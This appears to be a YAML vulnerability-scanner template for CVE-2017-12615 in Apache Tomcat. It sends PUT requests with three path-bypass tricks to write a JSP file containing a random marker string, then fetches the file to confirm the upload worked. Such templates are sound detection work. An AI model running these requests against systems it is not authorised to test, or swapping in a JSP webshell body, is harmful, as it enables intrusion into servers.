name: poc-yaml-apache-tomcat-put-rce-cve-2017-12615
binding: e8a2e498-0adb-4554-9990-049a3fad3548
manual: true
detail:
    author: d4rksec
transport: http
set:
    filename: randomLowercase(6)
    randstr: randomLowercase(20)
rules:
    r0:
        request:
            cache: true
            method: PUT
            path: /{{filename}}.jsp/
            body: '{{randstr}}'
            follow_redirects: false
        expression: response.status == 201 || response.status == 204 || response.status == 200
    r1:
        request:
            cache: true
            method: PUT
            path: /{{filename}}.jsp%20
            body: '{{randstr}}'
            follow_redirects: false
        expression: response.status == 201 || response.status == 204 || response.status == 200
    r2:
        request:
            cache: true
            method: PUT
            path: /{{filename}}.jsp::$DATA
            body: '{{randstr}}'
            follow_redirects: false
        expression: response.status == 201 || response.status == 204 || response.status == 200
    ck:
        request:
            cache: true
            method: GET
            path: /{{filename}}.jsp
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(string(randstr))
expression: r0() && ck() || r1() && ck() || r2() && ck()
